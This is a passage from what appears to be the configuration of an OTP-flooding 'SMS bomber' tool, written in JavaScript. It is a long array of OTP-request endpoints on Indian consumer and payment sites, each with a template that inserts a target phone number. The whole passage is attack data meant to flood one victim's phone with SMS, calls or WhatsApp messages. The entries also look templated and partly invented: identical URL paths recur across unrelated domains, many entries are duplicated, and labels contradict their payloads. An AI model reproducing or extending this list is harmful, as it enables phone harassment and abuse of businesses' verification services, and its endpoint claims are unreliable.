  { 'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Rapido Call', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Goibibo SMS', 'url': 'https://goibibo.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Khatabook Call', 'url': 'https://khatabook.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Ajio Call', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Jupiter Call', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart Call', 'url': 'https://flipkart.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato Call', 'url': 'https://zomato.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato Call', 'url': 'https://zomato.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Swiggy Call', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Uber Call', 'url': 'https://uber.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Cred Call', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zivame SMS', 'url': 'https://zivame.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
